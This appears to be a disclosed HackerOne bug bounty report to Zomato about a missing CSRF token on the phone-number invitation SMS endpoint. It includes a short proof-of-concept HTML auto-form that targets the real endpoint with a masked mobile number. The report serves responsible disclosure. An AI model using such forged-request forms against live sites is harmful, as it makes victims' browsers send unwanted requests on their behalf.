# CSRF AT INVITING PEOPLE THOUGH PHONE NUMBER

## Report Details
- **Report ID**: 113865
- **URL**: https://hackerone.com/reports/113865
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-02-01T14:07:30.808Z
- **Disclosed**: 2016-09-14T15:10:19.652Z

## Reporter
- **Username**: kiraak-boy
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: zomato

## Vulnerability Information
Hello,

Please Add CSRF Token While Inviting The User Though Phone Number , You Have Good Rate Limit Protection But At The Same Time Add CSRF TOKEN :-

CODE :-

<html>
<body>
<form action="https://www.zomato.com/php/restaurantSmsHandler">
<input type="hidden" name="type" value="zomato&#45;app&#45;details" />
<input type="hidden" name="mobile&#95;no" value="xxxxxxxxxxxxxx" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>

Thanks!

## Attachments
No attachments
